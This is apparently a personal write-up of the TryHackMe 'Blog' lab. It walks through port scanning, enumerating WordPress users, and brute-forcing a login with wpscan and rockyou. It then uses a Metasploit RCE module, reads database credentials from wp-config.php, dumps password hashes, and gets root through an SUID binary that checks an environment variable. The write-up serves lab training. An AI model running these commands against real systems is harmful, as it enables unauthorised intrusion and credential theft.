---
created: 2026-03-13
modified: 2026-03-13
---

This is a challenge in THM tailor to test your wordpress enumeration skill.
challnge description:

>*Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!*
>*Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...*


## Recon

### Port Scan

```
sudo nmap -Pn -sCV -p- --min-rate 2000 -T3 -oN blog-port-scan 10.10.228.216  
[sudo] password for darklight: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-27 15:15 EAT
Nmap scan report for 10.10.228.216
Host is up (0.23s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-08-27T12:15:57
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2025-08-27T12:15:57+00:00
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.73 seconds

```


We have a wordpress version 5 .. serach the web for a cve i got this 
https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce/

A remote code execution

enumeratinng user i got this at : http://blog.thm/wp-json/wp/v2/users

```
[
  {
    "id": 1,
    "name": "Billy Joel",
    "url": "",
    "description": "",
    "link": "http://blog.thm/author/bjoel/",
    "slug": "bjoel",
    "avatar_urls": {
      "24": "http://0.gravatar.com/avatar/9943fa6dfe2ab4088f676ff75dc1f848?s=24&d=mm&r=g",
      "48": "http://0.gravatar.com/avatar/9943fa6dfe2ab4088f676ff75dc1f848?s=48&d=mm&r=g",
      "96": "http://0.gravatar.com/avatar/9943fa6dfe2ab4088f676ff75dc1f848?s=96&d=mm&r=g"
    },
    "meta": [],
    "_links": {
      "self": [
        {
          "href": "http://blog.thm/wp-json/wp/v2/users/1"
        }
      ],
      "collection": [
        {
          "href": "http://blog.thm/wp-json/wp/v2/users"
        }
      ]
    }
  },
  {
    "id": 3,
    "name": "Karen Wheeler",
    "url": "",
    "description": "",
    "link": "http://blog.thm/author/kwheel/",
    "slug": "kwheel",
    "avatar_urls": {
      "24": "http://0.gravatar.com/avatar/3e7bf1e5f26496543c964dc04515bb6a?s=24&d=mm&r=g",
      "48": "http://0.gravatar.com/avatar/3e7bf1e5f26496543c964dc04515bb6a?s=48&d=mm&r=g",
      "96": "http://0.gravatar.com/avatar/3e7bf1e5f26496543c964dc04515bb6a?s=96&d=mm&r=g"
    },
    "meta": [],
    "_links": {
      "self": [
        {
          "href": "http://blog.thm/wp-json/wp/v2/users/3"
        }
      ],
      "collection": [
        {
          "href": "http://blog.thm/wp-json/wp/v2/users"
        }
      ]
    }
  }
]
```

two users 

using wpscan to bruteforce the password i got the password for kwheel.
command:

```bash
wpscan --url http://blog.thm/ -t 50 -U users.txt -P /usr/share/wordlists/rockyou.txt --api-token [REDACTED]
```

```
[SUCCESS] - kwheel / cutiepie1       
```


I used this options to exploit the RCE 

![[Pasted_image_20250828085218.png]]

![[Pasted_image_20250828090917.png]]

checking the files in the wordpress directory i got the credentials for the database

```bash
www-data@blog:/var/www/wordpress$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

/* Custom */
/*
define('WP_HOME', '/');
define('WP_SITEURL', '/'); */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'blog');

/** MySQL database username */
define('DB_USER', 'wordpressuser');

/** MySQL database password */
define('DB_PASSWORD', 'LittleYellowLamp90!@');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */

[SNIP]
```

with the credentials we are able to login to mysql database and we get a users table from which we get password hashes 

```sql
mysql> select * from wp_users;
select * from wp_users;
+----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
| ID | user_login | user_pass                          | user_nicename | user_email                   | user_url | user_registered     | user_activation_key | user_status | display_name  |
+----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
|  1 | bjoel      | $P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/ | bjoel         | nconkl1@outlook.com          |          | 2020-05-26 03:52:26 |                     |           0 | Billy Joel    |
|  3 | kwheel     | $P$BedNwvQ29vr1TPd80CDl6WnHyjr8te. | kwheel        | zlbiydwrtfjhmuuymk@ttirv.net |          | 2020-05-26 03:57:39 |                     |           0 | Karen Wheeler |
+----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
2 rows in set (0.00 sec)
```

The hash wan't crackable. Rnning metasploit didn't give me anything either.. 

Finding files with `SUID` permissions 

```bash
find / -perm -4000 -type f 2>/dev/null
```

found this :

![[Pasted_image_20250828102402.png]]


**/usr/sbin/checker**

running the binary i get this 

![[Pasted_image_20250828102522.png]]

lets download the file and anlyze it to know how it know we are not admin 
![[Pasted_image_20250828110145.png]]

```bash
strings checker       
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
puts
getenv
system
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
```

there are two comands that caught my eye:

- The `setuid` permission bit makes a program run with the privileges of the file’s owner (often root), instead of the user who launched it.
- `getenv` is a function (in C, PHP, Python, etc.) that **retrieves the value of an environment variable**.

Lets reverse engineer the binary and see how it uses this two commands .. am going to use ghidra for this.. 

Oops... i dotn have ghidra installed yet ..

am going to use an online tool... has intergrated ghidra though

https://dogbolt.org/

```c
undefined8 main(void)

{
  char *pcVar1;
  
  pcVar1 = getenv("admin");
  if (pcVar1 == (char *)0x0) {
    puts("Not an Admin");
  }
  else {
    setuid(0);
    system("/bin/bash");
  }
  return 0;
}
```


The binay checks if the environment variable `admin` exists.. if not we get the message `Not an Admin`  else we get a shell with root privileges.

to trick the binary we can just run this `export admin=anyvalue` eg `export admin=1`

```bash
www-data@blog:/tmp$ export admin=1
export admin=1
www-data@blog:/tmp$ /usr/sbin/checker
/usr/sbin/checker
root@blog:/tmp# whoami
whoami
root
root@blog:/tmp# 
```

to locate the user.txt file use `find` to get all instances of user.txt .. `locate` does return all the first instace.

```bash
root@blog:/root# locate user.txt
locate user.txt
/home/bjoel/user.txt
root@blog:/root# find / -name user.txt 2>/dev/null
find / -name user.txt 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt
root@blog:/root# 
```

